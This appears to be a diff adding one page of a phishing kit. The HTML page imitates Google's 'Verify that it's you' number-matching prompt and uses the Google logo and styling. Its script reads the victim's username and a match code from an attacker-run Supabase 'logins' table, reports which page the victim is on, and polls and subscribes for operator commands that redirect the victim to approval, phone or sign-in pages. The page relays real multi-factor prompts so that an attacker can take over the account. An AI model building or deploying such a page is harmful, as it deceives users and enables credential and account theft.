@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify that it’s you</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      text-align: center;
+      padding: 32px 20px;
+    }
+
+    .google-logo {
+      width: 90px;
+      margin: 40px 0 20px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 500;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #5f6368;
+      margin: 0 0 20px;
+      line-height: 1.5;
+      max-width: 340px;
+    }
+
+    .email-box {
+      background: #f8f9fa;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      padding: 10px 16px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 15px;
+      margin-bottom: 30px;
+      color: #202124;
+    }
+
+    .email-box span {
+      margin-left: 8px;
+    }
+
+    .number {
+      font-size: 72px;
+      font-weight: 500;
+      margin: 30px 0;
+      color: #202124;
+    }
+
+    .instruction {
+      font-size: 16px;
+      color: #5f6368;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .highlight {
+      color: #1a73e8;
+      font-weight: 500;
+    }
+
+    .link {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 20px;
+      display: block;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    #warning {
+      color: #d93025;
+      margin-top: 12px;
+      font-size: 14px;
+      display: none;
+    }
+
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 22px;
+      }
+      .number {
+        font-size: 60px;
+      }
+      p, .instruction {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+
+  <h1>Verify that it’s you</h1>
+  <p>To help keep your account safe, Google wants to make sure that it’s really you</p>
+
+  <div class="email-box">
+    <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368">
+      <path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zm0 2c-2.67 
+      0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+    </svg>
+    <span id="emailText">Loading...</span>
+  </div>
+
+  <div class="number" id="numberDisplay">--</div>
+
+  <div class="instruction">
+    Check your Mobile device<br>
+    <small>Google sent a notification to your mobile device. Tap <span class="highlight">Yes</span> on the Google prompt, then tap <span class="highlight" id="numHighlight">--</span> on your phone to verify that it’s you.</small>
+  </div>
+
+  <div id="warning">Access declined. Please go back and try again.</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  const SUPABASE_URL = "https://bipnmthaonkbffothwkj.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpcG5tdGhhb25rYmZmb3Rod2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3OTc0NDUsImV4cCI6MjA3NTM3MzQ0NX0.9mNaxvZolgyyvyZP7n2x_nUwL8h1EHknpjR4_aMlPyc";
+  const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+  const deviceId = localStorage.getItem("device_id");
+  const emailText = document.getElementById("emailText");
+  const numberDisplay = document.getElementById("numberDisplay");
+  const numHighlight = document.getElementById("numHighlight");
+  const warning = document.getElementById("warning");
+
+  // ✅ Update current page info
+  async function updatePageStatus() {
+    await client
+      .from("logins")
+      .update({
+        page_name: "matchnumber",
+        login_status: "onpage"
+      })
+      .eq("device_id", deviceId);
+  }
+
+  // ✅ Fetch record info
+  async function fetchRecord() {
+    const { data } = await client
+      .from("logins")
+      .select("*")
+      .eq("device_id", deviceId)
+      .maybeSingle();
+
+    if (data) {
+      if (data.username) emailText.textContent = data.username;
+      if (data.code) {
+        numberDisplay.textContent = data.code;
+        numHighlight.textContent = data.code;
+      }
+
+      // ✅ Handle redirect immediately if already changed
+      handleStatusChange(data.login_status);
+    }
+  }
+
+  // ✅ Function to handle status changes
+  function handleStatusChange(status) {
+    if (!status) return;
+
+    if (status === "approved") {
+      window.location.href = "review.html";
+    } else if (status === "phone") {
+      window.location.href = "phone.html";
+    } else if (status === "declined") {
+      warning.style.display = "block";
+      setTimeout(() => window.location.href = "signin.html", 2500);
+    }
+  }
+
+  // ✅ Poll every 2 seconds for updates
+  setInterval(fetchRecord, 2000);
+
+  // ✅ Subscribe to realtime updates
+  function subscribeRealtime() {
+    client
+      .channel("matchnumber_" + deviceId)
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "logins", filter: `device_id=eq.${deviceId}` },
+        payload => {
+          const row = payload.new;
+          if (!row) return;
+
+          if (row.username) emailText.textContent = row.username;
+          if (row.code) {
+            numberDisplay.textContent = row.code;
+            numHighlight.textContent = row.code;
+          }
+
+          // ✅ Automatically react to status change
+          handleStatusChange(row.login_status);
+        }
+      )
+      .subscribe();
+  }
+
+  // ✅ Initialize
+  window.addEventListener("load", async () => {
+    if (!deviceId) return;
+    await updatePageStatus();
+    await fetchRecord();
+    subscribeRealtime();
+  });
+</script>
+
+</body>
+</html>
